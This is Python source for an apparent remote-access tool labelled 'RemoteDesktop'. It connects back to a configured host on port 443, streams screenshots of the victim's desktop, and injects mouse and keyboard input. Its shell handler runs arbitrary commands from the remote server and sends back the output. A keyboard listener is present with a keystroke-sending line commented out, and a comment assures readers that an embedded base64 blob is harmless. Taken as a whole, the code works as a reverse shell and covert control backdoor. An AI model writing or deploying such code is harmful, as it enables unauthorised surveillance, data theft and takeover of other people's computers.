import cv2
import numpy as np
import pyautogui
import socket
import pickle
import struct
from threading import Thread
from pynput.mouse import Button, Controller
import win32gui
import lzma
from io import BytesIO
from PIL import Image
import base64
from pynput.keyboard import Key, Listener
import subprocess
import mss
import os
import json
from screeninfo import get_monitors
''' DONT WORRY THIS BASE64 IS A MOUSE IMAGE. YOU CAN DECODE IT AND OBSERVE THE CODE! '''
mouse = '''iVBORw0KGgoAAAANSUhEUgAAABEAAAAXCAYAAADtNKTnAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjnRFWHRDb21tZW50AGNIUk0gY2h1bmtsZW4gMzIgaWdub3JlZA1BU0NJSTogLi56JS4uLi4uLi4lLi4uLi4ubV8uLi5sLi48Li4uLlgNSEVYOiAwMDAwN0EyNTAwMDA4MDgzMDAwMEY0MjUwMDAwODREMTAwMDA2RDVGMDAwMEU4NkMwMDAwM0M4QjAwMDAxQjU4GN773QAAAgFJREFUeJyUlEtLAlEUx0cd7YFagUkvxKIgiB4USEREUNAqWgvtatEnaNVnaVWrNrVoEURFT6JCxBDDIpKScGG5EATR2/9MZ6ZrjjJe+MHMmXt+c+65c0cRQihEuVy2lUolO0HXetwKil31valN3SFFUVygFTQDJ7CBhiSHYA45ncAHvI2INMlH+lNAcgRWkDMI+kCbVZEmwYVg0SlYRc7of5EliSS6AGtIHLMqqpBIoiuwblVUJZFE12Yis+03leBbEanUu2VRlYQExWJRFAoF8fzyWlMkL61CIgvy+bzI5XIiHk/UFdH2GxIzQTabFZlMRkQiUTPR3wdJknqCdDqN/qTE7e2dwNwrJM2AEdDFx8SuSWTB01PSEODZjcQ1uGQJVRMAHuDQJLLA1ezL7ezuaRVw4pbb27OEyfNgGkyAIdAN3IZEEnyDDcQepSXEMHEBzIJxEOSD6uGT/7scFnyBMIJziJ3s7x+KZDJJkmOwyRJaRi8LnJqAd+cIyVmwiNthMIVYGEQTiYQ4OzsnUZTk9KyiF3y69aHy3tPWDThcPX1IPCBBLBYjyT1XEuJ+dHBOxaCymvgN7WikG4kB8AC2wTLik9zUfn5hlUQXqQyValNdfjugb8HPDQ3ydavRD31N8rpMBklb+O1eFlDM+OOZ/2RqV+mQK9Dn/wAAAP//AwCGMlcrSCX+UAAAAABJRU5ErkJggg=='''

class RemoteDesktop:
    def __init__(self, host, port):
        self.ip = host
        self.port = port
        self.active = False
        self.socket = socket.socket()
        self.LeftMouseup = False
        self.RightMouseup = False
        self.userinput = False
        self.quality = 15
        self.monitor = 1
        self.powershell = False

        
    def display(self) -> bytes:
        screen_info = []
        for monitor in get_monitors():
            screen_info.append({
                "size": (monitor.width, monitor.height),
                "resolution": (monitor.width, monitor.height),
                "position": (monitor.x, monitor.y),
                "len_monitors": (len(get_monitors()) - 1)
            })
        json_data = json.dumps(screen_info)
        display = json_data.encode('utf-8')
        return display


    def record(self) -> np:
        if not self.userinput:
            screenshot = mss.mss().grab(mss.mss().monitors[self.monitor])
            imCursor = Image.open(BytesIO(base64.b64decode(mouse)))
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            curX,curY=win32gui.GetCursorPos()
            img.paste(imCursor,box=(curX,curY),mask=imCursor)
            return np.array(img)
        else:
            screenshot = mss.mss().grab(mss.mss().monitors[self.monitor])
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            return np.array(img)
    
    def on_press(self, key):
        keyboard = str(key)
        #self.send(keyboard.encode('utf-8'))

    def recv_msg(self):
        return self.socket.recv(1028).decode()

    def send(self, data):
        self.socket.send(struct.pack('>L', len(data)) + data)

    def shell(self, data):
        data = "".join(data)
        if data.startswith('cd '):
        # Change the current working directory
            os.chdir(data[3:])
            self.send((os.getcwd() + ">").encode())
        else:
            runcmd = subprocess.Popen(data,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
            a = bytes(os.getcwd() + ">", encoding="utf-8") + runcmd.stdout.read() + runcmd.stderr.read()
            self.send(a)
                    
    def __servercontrol(self):
        debug = False
        if not debug:
            while self.active:
                try:
                    data = self.recv_msg()
                    if data.startswith("shell"):
                        data = data.split(":", 1)
                    else:
                        data = data.split(":")
                    if data[0] == "mouse":
                        mouse = Controller()
                        xAxis, yAxis, event, flags = int(data[1]), int(data[2]), int(data[3]), int(data[4])
                        # print(xAxis, yAxis)
                        if xAxis < 0 and yAxis < 0:
                            pass
                        else:
                            mouse.position = (xAxis,yAxis)
                            if flags == 1:
                                if self.LeftMouseup:
                                    pass
                                else:
                                    mouse.press(Button.left)
                                    self.LeftMouseup = True
                            elif flags == 0:
                                if self.LeftMouseup:
                                    mouse.release(Button.left)
                                    self.LeftMouseup = False
                                else:
                                    pass
                            elif event == 2:
                                mouse.click(Button.right)
                            elif event == 7:
                                pyautogui.doubleClick(xAxis,yAxis)
                            elif event == 10:
                                if flags > 0:
                                    mouse.scroll(0, -1)
                                else:
                                    mouse.scroll(0, 1)
                    elif data[0] == "keyboard":
                        keys = int(data[1])
                        if keys == 13:
                            pyautogui.press("enter")
                        else:
                            pyautogui.press(chr(keys))
                    elif data[0] == "config":
                        self.quality = int(data[1])
                        self.monitor = int(data[3])
                        if data[2] == "0":
                            self.userinput = False
                        else:
                            self.userinput = True
                    elif data[0] == "shell":
                        self.shell(data[1:])
                except:
                    pass
                
    def __client_streaming(self):
        self.socket.connect((self.ip, self.port))
        self.socket.send(self.display())
        while self.active:
            try:
                frame = self.record()
            except:
                continue
            _, frame = cv2.imencode('.jpeg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), self.quality])
            data = pickle.dumps(frame, 0)
            video = lzma.compress(data)
            video = b"video->"+video
            try:
                self.send(video)
            except ConnectionResetError:
                self.active = False
            except ConnectionAbortedError:
                self.active = False
            except BrokenPipeError:
                self.active = False
        cv2.destroyAllWindows()

    def connect(self):
        if self.active:
            print("Client already up and running")
        else:
            self.active = True
            client_thread = Thread(target=self.__client_streaming)
            client_thread.start()
            controller = Thread(target=self.__servercontrol)
            controller.start()
            with Listener(on_press = self.on_press) as l:
                l.join()
            
    def stop_stream(self):
        if self.active:
            self.active = False
        else:
            print("Client is not active!")

if __name__ == '__main__':
    #IPV4 ADDRESS
    remote = RemoteDesktop("localhost", 443)
    remote.connect()
